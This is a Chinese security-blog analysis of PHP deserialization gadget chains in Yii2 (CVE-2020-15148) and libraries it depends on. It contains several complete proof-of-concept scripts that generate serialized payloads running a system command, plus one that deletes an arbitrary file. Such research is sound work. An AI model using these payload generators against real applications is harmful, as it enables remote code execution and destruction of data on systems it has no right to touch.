# Yii反序列化分析

阅读量 **191010**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-09-23 10:30:01

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t010a8938d1668ce285.jpg)

## 前言

最近Yii2出了反序列化RCE漏洞，借着这个漏洞，分析了Yii的几条POP链，同时基于这几条POP链的挖掘思路，把Yii2的可以触发发序列化的链子总结了以下。

## 本地环境

php：7.2.10

Yii版本：yii-basic-app-2.0.37

## RCE-POP链-1（CVE-2020-15148）

<https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99#diff-4850e9cae84cf426012918c8f3394d21>

![](https://p3.ssl.qhimg.com/t01e0d9a86d807553e4.png)

补丁修复是通过在BatchQueryResult.php增加了一个__wakeup()魔法函数来防止反序列化。低版本的php是可以绕过的。

我们直接去定位这个文件：

![](https://p1.ssl.qhimg.com/t019c56aebdaa811384.png)

$_dataReader可控，到这里又两个思路，一个是去触发__call另一个就是去找close，我们先找close方法

    
    
    //vendor/yiisoft/yii2/web/DbSession.php:146
        public function close()
        {
            if ($this->getIsActive()) {
                // prepare writeCallback fields before session closes
                $this->fields = $this->composeFields();
                YII_DEBUG ? session_write_close() : @session_write_close();
            }
        }
    
    //vendor/yiisoft/yii2/web/Session.php:220
        public function getIsActive()//可以看先知师傅的文章，一直返回true
        {
            return session_status() === PHP_SESSION_ACTIVE;
        }
    
    //vendor/yiisoft/yii2/web/MultiFieldSession.php:96
        protected function composeFields($id = null, $data = null)
        {
            $fields = $this->writeCallback ? call_user_func($this->writeCallback, $this) : [];
            if ($id !== null) {
                $fields['id'] = $id;
            }
            if ($data !== null) {
                $fields['data'] = $data;
            }
            return $fields;
        }
    

找到这里发现这条链之前有师傅在先知发过[—>文章链接](https://xz.aliyun.com/t/8082#toc-8)，利用`[(new
test), "aaa"]`来调用任意test类的aaa方法，绕过了`call_user_func`参数不可控。

用`call_user_func\(\$this->([a-zA-Z0-9]+),
\$this->([a-zA-Z0-9]+)`来找可控的`call_user_func`方法，一共找到以下两条。

![](https://p4.ssl.qhimg.com/t0168c9c559249b9f5a.png)

![](https://p2.ssl.qhimg.com/t0174be597840d7799c.png)

用第一个构造POC：

    
    
    <?php
        namespace yii\rest{
            class IndexAction {
                public $checkAccess;
                public $id;
                public function __construct()
                {
                    $this->checkAccess="system";
                    $this->id="calc.exe";
    
                }
            }
        }
        namespace yii\web{
            use yii\rest\IndexAction;
    
            class DbSession {
                protected $fields = [];
                public $writeCallback;
                public function __construct()
                {
                    $this->writeCallback=[(new IndexAction),"run"];
                    $this->fields['1'] = 'aaa';
                }
    
            }
        }
        namespace yii\db {
            use yii\web\DbSession;
    
            class BatchQueryResult
            {
                private $_dataReader;
                public function __construct()
                {
                    $this->_dataReader=new DbSession();
                }
            }
        }
        namespace {
            $exp=print(urlencode(serialize(new yii\db\BatchQueryResult())));
        }
    ?>
    

现在我们在回头看__call是否行得通，下面是网上目前公开的一条利用__call的POP链

    
    
    //vendor/fzaninotto/faker/src/Faker/Generator.php:283
        public function __call($method, $attributes)
        {
            return $this->format($method, $attributes);
        }
    
    //vendor/fzaninotto/faker/src/Faker/Generator.php:226
        public function format($formatter, $arguments = array())
        {
            return call_user_func_array($this->getFormatter($formatter), $arguments);
        }
    
    //vendor/fzaninotto/faker/src/Faker/Generator.php:236
        public function getFormatter($formatter)
        {
            if (isset($this->formatters[$formatter])) {
                return $this->formatters[$formatter];
            }
            foreach ($this->providers as $provider) {
                if (method_exists($provider, $formatter)) {
                    $this->formatters[$formatter] = array($provider, $formatter);
    
                    return $this->formatters[$formatter];
                }
            }
            throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
        }
    

在这条链里getFormatter我们是可控的，通过控制`formatters['close']`的键值，由此我们可以去调用任意类的任意方法，跟上面的链一样，我们可以去调用run方法，这样就可以构造如下POC：

    
    
    <?php
    namespace yii\rest{
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct()
            {
                $this->checkAccess="system";
                $this->id="calc.exe";
    
            }
        }
    }
    
    namespace Faker{
        use yii\rest\IndexAction;
        class Generator{
            protected $formatters = array();
            public function __construct()
            {
                $this->formatters['close']=[new IndexAction,"run"];
            }
        }
    
    }
    
    namespace yii\db {
        use Faker\Generator;
    
        class BatchQueryResult
        {
            private $_dataReader;
            public function __construct()
            {
                $this->_dataReader=new Generator();
            }
        }
    }
    namespace {
        $exp=print(urlencode(serialize(new yii\db\BatchQueryResult())));
    }
    

这条链任何一个反序列化入口点都可以利用，有师傅提交了两处入口点可以参考

<https://github.com/yiisoft/yii2/issues/18293>

分别使用了

vendor/codeception/codeception/ext/RunProcess.php:93

vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php:289

除了这两条也有很多，这里就不都列出来了，感兴趣的师傅可以自己找找

## RCE—POP链-2

我们再来分析以下上面文章提到的一条__wakeup的POP链

    
    
    //vendor/symfony/string/UnicodeString.php:348
        public function __wakeup()
        {
            normalizer_is_normalized($this->string) ?: $this->string = normalizer_normalize($this->string);
        }
    

这个地方`$this->string`我们是可控的，查看官方手册，第一个参数要求是String类型，如此我们就可以去寻找可利用的__toString方法

![](https://p5.ssl.qhimg.com/t01f21fc3259a0ef86d.png)

文章里作者利用的是`vendor/symfony/string/LazyString.php:96`中的`__toString`方法

    
    
        public function __toString()
        {
            if (\is_string($this->value)) {
                return $this->value;
            }
    
            try {
                return $this->value = ($this->value)();
            } catch (\Throwable $e) {
                if (\TypeError::class === \get_class($e) && __FILE__ === $e->getFile()) {
                    $type = explode(', ', $e->getMessage());
                    $type = substr(array_pop($type), 0, -\strlen(' returned'));
                    $r = new \ReflectionFunction($this->value);
                    $callback = $r->getStaticVariables()['callback'];
    
                    $e = new \TypeError(sprintf('Return value of %s() passed to %s::fromCallable() must be of the type string, %s returned.', $callback, static::class, $type));
                }
    
                if (\PHP_VERSION_ID < 70400) {
                    // leverage the ErrorHandler component with graceful fallback when it's not available
                    return trigger_error($e, E_USER_ERROR);
                }
    
                throw $e;
            }
        }
    

`$this->value = ($this->value)();`value值可控，继续用它来调用run方法，进行RCE，POC如下：

    
    
    <?php
    namespace yii\rest{
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct()
            {
                $this->checkAccess="system";
                $this->id="calc.exe";
    
            }
        }
    }
    
    namespace Symfony\Component\String{
        use yii\rest\IndexAction;
        class LazyString{
            private $value;
            public function __construct()
            {
                $this->value=[new IndexAction,"run"];
            }
    
        }
        class UnicodeString{
            protected $string = '';
            public function __construct()
            {
                $this->string=new LazyString;
            }
        }
    }
    namespace {
        $exp=print(urlencode(serialize(new Symfony\Component\String\UnicodeString())));
    }
    

同样的我们也可以利用__wakeup来触发上面的__call的POP链，在`vendor/codeception/codeception/src/Codeception/Util/XmlBuilder.php:165`找到一处利用点

    
    
        public function __toString()
        {
            return $this->__dom__->saveXML();
        }
    

POC如下：

    
    
    <?php
    namespace yii\rest{
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct()
            {
                $this->checkAccess="system";
                $this->id="calc.exe";
            }
        }
    }
    
    namespace Faker{
        use yii\rest\IndexAction;
        class Generator{
            protected $formatters = array();
            public function __construct()
            {
                $this->formatters['saveXML']=[new IndexAction,"run"];
            }
        }
    }
    
    namespace Codeception\Util{
        use Faker\Generator;
        class XmlBuilder{
            protected $__dom__;
            public function __construct()
            {
                $this->__dom__=new Generator();
            }
    
        }
    }
    
    namespace Symfony\Component\String{
        use Codeception\Util\XmlBuilder;
        class UnicodeString{
            protected $string = '';
            public function __construct()
            {
                $this->string=new XmlBuilder();
            }
        }
    }
    namespace {
        $exp=print(urlencode(serialize(new Symfony\Component\String\UnicodeString())));
    }
    

## RCE-POP链-3

根据上面的思路，又找到如下一条入口：

    
    
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php:36
        public function __destruct()
        {
            if (file_exists($this->getPath())) {
                @unlink($this->getPath());
            }
        }
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/FileByteStream.php:56
        public function getPath()
        {
            return $this->path;
        }
    

这个地方`$this->path;`可控，此处其实就已经是一个任意文件删除了，POC如下：

    
    
    <?php
    
    namespace {
        class Swift_ByteStream_FileByteStream{
            private $path;
            public function __construct()
            {
                $this->path='D:\test.txt';
            }
        }
        class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream{
        }
        $exp=print(urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream())));
    }
    

当然最后的目标肯定是RCE，`file_exists`的参数通用是需要String类型，后面就和上面的思路一样了，调用`__toString`方法。

POC如下：

    
    
    <?php
    namespace yii\rest{
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct()
            {
                $this->checkAccess="system";
                $this->id="calc.exe";
    
            }
        }
    }
    namespace Symfony\Component\String{
        use yii\rest\IndexAction;
        class LazyString{
            private $value;
            public function __construct()
            {
                $this->value=[new IndexAction,"run"];
            }
    
        }
    }
    namespace {
        use Symfony\Component\String\LazyString;
        class Swift_ByteStream_FileByteStream{
            private $path;
            public function __construct()
            {
                $this->path=new LazyString();
            }
        }
        class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream{
        }
        $exp=print(urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream())));
    }
    

## RCE-POP链-4

同样是利用`__toString`方法

    
    
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php:289
        public function __destruct()
        {
            foreach ($this->keys as $nsKey => $null) {
                $this->clearAll($nsKey);
            }
        }
    }
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php:225
        public function clearAll($nsKey)
        {
            if (array_key_exists($nsKey, $this->keys)) {
                foreach ($this->keys[$nsKey] as $itemKey => $null) {
                    $this->clearKey($nsKey, $itemKey);
                }
                if (is_dir($this->path.'/'.$nsKey)) {
                    rmdir($this->path.'/'.$nsKey);
                }
                unset($this->keys[$nsKey]);
            }
        }
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php:212
        public function clearKey($nsKey, $itemKey)
        {
            if ($this->hasKey($nsKey, $itemKey)) {
                $this->freeHandle($nsKey, $itemKey);
                unlink($this->path.'/'.$nsKey.'/'.$itemKey);
            }
        }
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php:201
        public function hasKey($nsKey, $itemKey)
        {
            return is_file($this->path.'/'.$nsKey.'/'.$itemKey);
        }
    

主要的触发点在`is_file`其中`$this->path`可控，且其参数需要是String类型

POC如下：

    
    
    <?php
    namespace yii\rest{
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct()
            {
                $this->checkAccess="system";
                $this->id="calc.exe";
    
            }
        }
    }
    namespace Symfony\Component\String{
        use yii\rest\IndexAction;
        class LazyString{
            private $value;
            public function __construct()
            {
                $this->value=[new IndexAction,"run"];
            }
    
        }
    }
    namespace {
        use Symfony\Component\String\LazyString;
        class Swift_KeyCache_DiskKeyCache
        {
            private $keys = [];
            private $path;
    
            public function __construct()
            {
                $this->keys['test'] = ['aaa'=>'qqq'];
                $this->path=new LazyString();
            }
        }
    
        $exp=print(urlencode(serialize(new Swift_KeyCache_DiskKeyCache())));
    }
    

## RCE-POP链-5

    
    
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php:536
        public function __destruct()
        {
            try {
                $this->stop();
            } catch (Exception $e) {
            }
        }
    //vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php:232
        public function stop()
        {
            if ($this->started) {
                if ($evt = $this->eventDispatcher->createTransportChangeEvent($this)) {
                    $this->eventDispatcher->dispatchEvent($evt, 'beforeTransportStopped');
                    if ($evt->bubbleCancelled()) {
                        return;
                    }
                }
    
                try {
                    $this->executeCommand("QUIT\r\n", [221]);
                } catch (Swift_TransportException $e) {
                }
    
                try {
                    $this->buffer->terminate();
    
                    if ($evt) {
                        $this->eventDispatcher->dispatchEvent($evt, 'transportStopped');
                    }
                } catch (Swift_TransportException $e) {
                    $this->throwException($e);
                }
            }
            $this->started = false;
        }
    

此处`$this->eventDispatcher`可控，可以继续利用上面的`__call`链来进行RCE，POC如下：

    
    
    <?php
    namespace yii\rest{
        class IndexAction {
            public $checkAccess;
            public $id;
            public function __construct()
            {
                $this->checkAccess="system";
                $this->id="calc.exe";
    
            }
        }
    }
    
    namespace Faker{
        use yii\rest\IndexAction;
        class Generator{
            protected $formatters = array();
            public function __construct()
            {
                $this->formatters['createTransportChangeEvent']=[new IndexAction,"run"];
            }
        }
    
    }
    namespace {
        use Faker\Generator;
    
        abstract class Swift_Transport_AbstractSmtpTransport{}
        class Swift_Transport_SendmailTransport extends Swift_Transport_AbstractSmtpTransport
        {
            protected $started;
            protected $eventDispatcher;
            public function __construct()
            {
                $this->started = True;
                $this->eventDispatcher = new Generator();
            }
        }
    
        $exp=print(urlencode(serialize(new Swift_Transport_SendmailTransport())));
    }
    

## 后言

至此本文就结束了，有错的地方希望师傅们指出，本文链的核心其实没有变，更多的是从不同的入口下手，后面的话会尝试寻找其他的链子。师傅们有思路欢迎交流。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Joker** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/217929](/post/id/217929)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)

 **+1** __5赞

 __收藏

![](https://p5.ssl.qhimg.com/t01f0ef5738485950e8.jpg) Joker

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

